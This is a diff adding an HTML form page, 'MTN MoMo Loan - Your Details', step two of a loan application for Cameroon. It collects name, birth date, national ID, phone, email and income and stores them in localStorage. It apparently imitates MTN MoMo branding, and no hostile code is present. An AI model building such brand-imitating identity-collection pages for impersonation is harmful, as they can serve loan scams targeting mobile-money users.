@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan - Your Details</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 8px 18px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+
+        .form-title .highlight {
+            color: #0047AB;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px auto;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66.67%;
+            height: 100%;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            transition: width 0.5s ease;
+        }
+
+        .step-text {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+
+        .form-label .required {
+            color: #e74c3c;
+            margin-left: 2px;
+        }
+
+        .form-select,
+        .form-input,
+        .form-textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: 'Inter', sans-serif;
+            background: white;
+            color: #333;
+        }
+
+        .form-select:focus,
+        .form-input:focus,
+        .form-textarea:focus {
+            border-color: #0047AB;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+
+        .form-textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .form-input::placeholder {
+            color: #aaa;
+        }
+
+        /* ===== DOB SPLIT INPUT (DD / MM / YYYY) ===== */
+        .dob-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .dob-field {
+            flex: 1;
+            text-align: center;
+            padding: 12px 8px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            color: #333;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            background: white;
+        }
+
+        .dob-field:focus {
+            border-color: #0047AB;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+
+        .dob-field::placeholder {
+            color: #bbb;
+            font-weight: 500;
+        }
+
+        .dob-separator {
+            font-size: 20px;
+            color: #999;
+            font-weight: 700;
+        }
+
+        /* ===== PHONE INPUT WITH +237 ===== */
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            background: white;
+        }
+
+        .phone-input:focus-within {
+            border-color: #0047AB;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+
+        .phone-prefix {
+            padding: 12px 14px;
+            background: #f0f4ff;
+            font-weight: 700;
+            font-size: 15px;
+            color: #0047AB;
+            border-right: 2px solid #e0e0e0;
+        }
+
+        .phone-input input {
+            border: none !important;
+            box-shadow: none !important;
+            flex: 1;
+            border-radius: 0;
+        }
+
+        .invalid {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .back-step-btn {
+            flex: 1;
+            padding: 16px;
+            background: #f0f4ff;
+            color: #0047AB;
+            border: 2px solid #e0e0e0;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .back-step-btn:hover {
+            background: #e0e8ff;
+            border-color: #0047AB;
+        }
+
+        .next-btn {
+            flex: 2;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .next-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+        }
+
+        .next-btn:active {
+            transform: scale(0.98);
+        }
+
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 20px;
+            }
+            .form-input,
+            .form-select,
+            .form-textarea {
+                font-size: 14px;
+                padding: 10px 12px;
+            }
+            .phone-prefix {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+            .dob-field {
+                font-size: 14px;
+                padding: 10px 4px;
+            }
+            .btn-row {
+                flex-direction: column-reverse;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='application.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <div style="width:28px;"></div>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">📋 Your <span class="highlight">Details</span></h1>
+        <p class="form-subtitle">Step 2 of 3</p>
+
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Tell us about yourself</div>
+
+        <!-- Full Name -->
+        <div class="form-group">
+            <label class="form-label">Full Name <span class="required">*</span></label>
+            <input type="text" class="form-input" id="fullName" placeholder="e.g. Jean-Paul Mballa">
+            <div class="error-text" id="nameError">Please enter your full name (min 3 characters)</div>
+        </div>
+
+        <!-- Date of Birth (DD / MM / YYYY) -->
+        <div class="form-group">
+            <label class="form-label">Date of Birth <span class="required">*</span></label>
+            <div class="dob-wrapper" id="dobWrapper">
+                <input type="text" class="dob-field" id="dobDay" placeholder="DD" maxlength="2" inputmode="numeric">
+                <span class="dob-separator">/</span>
+                <input type="text" class="dob-field" id="dobMonth" placeholder="MM" maxlength="2" inputmode="numeric">
+                <span class="dob-separator">/</span>
+                <input type="text" class="dob-field" id="dobYear" placeholder="YYYY" maxlength="4" inputmode="numeric">
+            </div>
+            <div class="error-text" id="dobError">Please enter a valid date of birth (you must be 18+)</div>
+        </div>
+
+        <!-- Gender -->
+        <div class="form-group">
+            <label class="form-label">Gender <span class="required">*</span></label>
+            <select class="form-select" id="gender">
+                <option value="">Select gender</option>
+                <option value="male">Male</option>
+                <option value="female">Female</option>
+            </select>
+            <div class="error-text" id="genderError">Please select your gender</div>
+        </div>
+
+        <!-- National ID -->
+        <div class="form-group">
+            <label class="form-label">National ID Number <span class="required">*</span></label>
+            <input type="text" class="form-input" id="idNumber" placeholder="e.g. 1234567890">
+            <div class="error-text" id="idError">Please enter a valid ID number (min 6 characters)</div>
+        </div>
+
+        <!-- Phone -->
+        <div class="form-group">
+            <label class="form-label">MoMo Phone Number <span class="required">*</span></label>
+            <div class="phone-input" id="phoneWrapper">
+                <span class="phone-prefix">+237</span>
+                <input type="tel" id="phone" placeholder="6XX XXX XXX">
+            </div>
+            <div class="error-text" id="phoneError">Please enter a valid Cameroon phone number (9 digits)</div>
+        </div>
+
+        <!-- Email -->
+        <div class="form-group">
+            <label class="form-label">Email Address <span class="required">*</span></label>
+            <input type="email" class="form-input" id="email" placeholder="you@example.com">
+            <div class="error-text" id="emailError">Please enter a valid email address</div>
+        </div>
+
+        <!-- Region -->
+        <div class="form-group">
+            <label class="form-label">Region <span class="required">*</span></label>
+            <select class="form-select" id="region">
+                <option value="">Select region</option>
+                <option>Adamawa</option>
+                <option>Centre</option>
+                <option>East</option>
+                <option>Far North</option>
+                <option>Littoral</option>
+                <option>North</option>
+                <option>Northwest</option>
+                <option>South</option>
+                <option>Southwest</option>
+                <option>West</option>
+            </select>
+            <div class="error-text" id="regionError">Please select your region</div>
+        </div>
+
+        <!-- City -->
+        <div class="form-group">
+            <label class="form-label">City / Town <span class="required">*</span></label>
+            <input type="text" class="form-input" id="city" placeholder="e.g. Douala">
+            <div class="error-text" id="cityError">Please enter your city or town</div>
+        </div>
+
+        <!-- Employment -->
+        <div class="form-group">
+            <label class="form-label">Employment Status <span class="required">*</span></label>
+            <select class="form-select" id="employment">
+                <option value="">Select status</option>
+                <option>Employed (Full-time)</option>
+                <option>Employed (Part-time)</option>
+                <option>Self-employed</option>
+                <option>Business Owner</option>
+                <option>Student</option>
+                <option>Unemployed</option>
+            </select>
+            <div class="error-text" id="employmentError">Please select your employment status</div>
+        </div>
+
+        <!-- Monthly Income -->
+        <div class="form-group">
+            <label class="form-label">Monthly Income (XAF) <span class="required">*</span></label>
+            <input type="number" class="form-input" id="income" placeholder="e.g. 150000" min="0">
+            <div class="error-text" id="incomeError">Please enter a valid monthly income</div>
+        </div>
+
+        <div class="btn-row">
+            <button class="back-step-btn" onclick="window.location.href='application.html'">← BACK</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP →</button>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <script>
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const dobDay = document.getElementById('dobDay');
+        const dobMonth = document.getElementById('dobMonth');
+        const dobYear = document.getElementById('dobYear');
+        const dobWrapper = document.getElementById('dobWrapper');
+        const dobError = document.getElementById('dobError');
+
+        // ============================================
+        // PRE-FILL FROM PREVIOUS STEPS (if user went back)
+        // ============================================
+        const fields = ['fullName', 'gender', 'idNumber', 'phone', 'email', 'region', 'city', 'employment', 'income'];
+        fields.forEach(id => {
+            const saved = localStorage.getItem('app_' + id);
+            if (saved) {
+                document.getElementById(id).value = saved;
+            }
+        });
+
+        // Pre-fill DOB (saved as YYYY-MM-DD)
+        const savedDob = localStorage.getItem('app_dob');
+        if (savedDob) {
+            const parts = savedDob.split('-');
+            if (parts.length === 3) {
+                dobYear.value = parts[0];
+                dobMonth.value = parts[1];
+                dobDay.value = parts[2];
+            }
+        }
+
+        // ============================================
+        // DOB INPUT FORMATTING (auto-advance + digits only)
+        // ============================================
+        function dobInputHandler(el, maxLen, nextEl) {
+            el.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length === maxLen && nextEl) {
+                    nextEl.focus();
+                }
+                // clear error as soon as all 3 fields have values
+                if (dobDay.value && dobMonth.value && dobYear.value.length === 4) {
+                    dobWrapper.classList.remove('invalid');
+                    dobError.classList.remove('show');
+                }
+            });
+        }
+
+        dobInputHandler(dobDay, 2, dobMonth);
+        dobInputHandler(dobMonth, 2, dobYear);
+        dobInputHandler(dobYear, 4, null);
+
+        // Backspace on empty field → go to previous field
+        dobMonth.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '') dobDay.focus();
+        });
+        dobYear.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '') dobMonth.focus();
+        });
+
+        // ============================================
+        // PHONE FORMATTER
+        // ============================================
+        document.getElementById('phone').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9 ]/g, '');
+        });
+
+        // ============================================
+        // VALIDATION HELPERS
+        // ============================================
+        function markInvalid(inputEl, errorEl, wrapper) {
+            if (wrapper) {
+                wrapper.classList.add('invalid');
+            } else {
+                inputEl.classList.add('invalid');
+            }
+            errorEl.classList.add('show');
+        }
+
+        function clearInvalid(inputEl, errorEl, wrapper) {
+            if (wrapper) {
+                wrapper.classList.remove('invalid');
+            } else {
+                inputEl.classList.remove('invalid');
+            }
+            errorEl.classList.remove('show');
+        }
+
+        // ============================================
+        // VALIDATE DOB (returns Date object or null)
+        // ============================================
+        function validateDob() {
+            const d = parseInt(dobDay.value, 10);
+            const m = parseInt(dobMonth.value, 10);
+            const y = parseInt(dobYear.value, 10);
+
+            if (!dobDay.value || !dobMonth.value || dobYear.value.length !== 4) return null;
+            if (isNaN(d) || isNaN(m) || isNaN(y)) return null;
+            if (m < 1 || m > 12) return null;
+            if (d < 1 || d > 31) return null;
+            if (y < 1900 || y > new Date().getFullYear()) return null;
+
+            const date = new Date(y, m - 1, d);
+            // check for invalid dates like 31/02
+            if (date.getFullYear() !== y || date.getMonth() !== m - 1 || date.getDate() !== d) return null;
+            return date;
+        }
+
+        function getAge(dob) {
+            const today = new Date();
+            let age = today.getFullYear() - dob.getFullYear();
+            const m = today.getMonth() - dob.getMonth();
+            if (m < 0 || (m === 0 && today.getDate() < dob.getDate())) age--;
+            return age;
+        }
+
+        // ============================================
+        // NEXT BUTTON HANDLER
+        // ============================================
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            let valid = true;
+            let firstError = null;
+
+            // Full name
+            const fullName = document.getElementById('fullName');
+            const nameError = document.getElementById('nameError');
+            clearInvalid(fullName, nameError);
+            if (!fullName.value.trim() || fullName.value.trim().length < 3) {
+                markInvalid(fullName, nameError);
+                valid = false;
+                firstError = firstError || fullName;
+            }
+
+            // DOB
+            clearInvalid(dobDay, dobError, dobWrapper);
+            const dobDate = validateDob();
+            if (!dobDate || getAge(dobDate) < 18) {
+                markInvalid(dobDay, dobError, dobWrapper);
+                valid = false;
+                firstError = firstError || dobDay;
+            }
+
+            // Gender
+            const gender = document.getElementById('gender');
+            const genderError = document.getElementById('genderError');
+            clearInvalid(gender, genderError);
+            if (!gender.value) {
+                markInvalid(gender, genderError);
+                valid = false;
+                firstError = firstError || gender;
+            }
+
+            // National ID
+            const idNumber = document.getElementById('idNumber');
+            const idError = document.getElementById('idError');
+            clearInvalid(idNumber, idError);
+            if (!idNumber.value.trim() || idNumber.value.trim().length < 6) {
+                markInvalid(idNumber, idError);
+                valid = false;
+                firstError = firstError || idNumber;
+            }
+
+            // Phone
+            const phone = document.getElementById('phone');
+            const phoneError = document.getElementById('phoneError');
+            const phoneWrapper = document.getElementById('phoneWrapper');
+            clearInvalid(phone, phoneError, phoneWrapper);
+            const digitsOnly = phone.value.replace(/\s/g, '');
+            if (digitsOnly.length !== 9 || !/^\d{9}$/.test(digitsOnly)) {
+                markInvalid(phone, phoneError, phoneWrapper);
+                valid = false;
+                firstError = firstError || phone;
+            }
+
+            // Email
+            const email = document.getElementById('email');
+            const emailError = document.getElementById('emailError');
+            clearInvalid(email, emailError);
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email.value.trim())) {
+                markInvalid(email, emailError);
+                valid = false;
+                firstError = firstError || email;
+            }
+
+            // Region
+            const region = document.getElementById('region');
+            const regionError = document.getElementById('regionError');
+            clearInvalid(region, regionError);
+            if (!region.value) {
+                markInvalid(region, regionError);
+                valid = false;
+                firstError = firstError || region;
+            }
+
+            // City
+            const city = document.getElementById('city');
+            const cityError = document.getElementById('cityError');
+            clearInvalid(city, cityError);
+            if (!city.value.trim()) {
+                markInvalid(city, cityError);
+                valid = false;
+                firstError = firstError || city;
+            }
+
+            // Employment
+            const employment = document.getElementById('employment');
+            const employmentError = document.getElementById('employmentError');
+            clearInvalid(employment, employmentError);
+            if (!employment.value) {
+                markInvalid(employment, employmentError);
+                valid = false;
+                firstError = firstError || employment;
+            }
+
+            // Income
+            const income = document.getElementById('income');
+            const incomeError = document.getElementById('incomeError');
+            clearInvalid(income, incomeError);
+            if (!income.value || parseFloat(income.value) <= 0) {
+                markInvalid(income, incomeError);
+                valid = false;
+                firstError = firstError || income;
+            }
+
+            if (!valid) {
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstError.focus();
+                }
+                return;
+            }
+
+            // Save everything to localStorage
+            localStorage.setItem('app_fullName', fullName.value.trim());
+            // DOB saved as ISO format for easy parsing later
+            const mm = String(dobMonth.value).padStart(2, '0');
+            const dd = String(dobDay.value).padStart(2, '0');
+            localStorage.setItem('app_dob', `${dobYear.value}-${mm}-${dd}`);
+            localStorage.setItem('app_gender', gender.value);
+            localStorage.setItem('app_idNumber', idNumber.value.trim());
+            localStorage.setItem('app_phone', '+237' + digitsOnly);
+            localStorage.setItem('app_email', email.value.trim());
+            localStorage.setItem('app_region', region.value);
+            localStorage.setItem('app_city', city.value.trim());
+            localStorage.setItem('app_employment', employment.value);
+            localStorage.setItem('app_income', income.value);
+
+            window.location.href = 'confirm.html';
+        });
+
+        // ============================================
+        // REAL-TIME VALIDATION (clear errors on input)
+        // ============================================
+        document.getElementById('fullName').addEventListener('input', function() {
+            if (this.value.trim().length >= 3) clearInvalid(this, document.getElementById('nameError'));
+        });
+        document.getElementById('gender').addEventListener('change', function() {
+            if (this.value) clearInvalid(this, document.getElementById('genderError'));
+        });
+        document.getElementById('idNumber').addEventListener('input', function() {
+            if (this.value.trim().length >= 6) clearInvalid(this, document.getElementById('idError'));
+        });
+        document.getElementById('phone').addEventListener('input', function() {
+            const digits = this.value.replace(/\s/g, '');
+            if (digits.length === 9) clearInvalid(this, document.getElementById('phoneError'), document.getElementById('phoneWrapper'));
+        });
+        document.getElementById('email').addEventListener('input', function() {
+            if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(this.value.trim())) clearInvalid(this, document.getElementById('emailError'));
+        });
+        document.getElementById('region').addEventListener('change', function() {
+            if (this.value) clearInvalid(this, document.getElementById('regionError'));
+        });
+        document.getElementById('city').addEventListener('input', function() {
+            if (this.value.trim()) clearInvalid(this, document.getElementById('cityError'));
+        });
+        document.getElementById('employment').addEventListener('change', function() {
+            if (this.value) clearInvalid(this, document.getElementById('employmentError'));
+        });
+        document.getElementById('income').addEventListener('input', function() {
+            if (this.value && parseFloat(this.value) > 0) clearInvalid(this, document.getElementById('incomeError'));
+        });
+    </script>
+</body>
+</html>
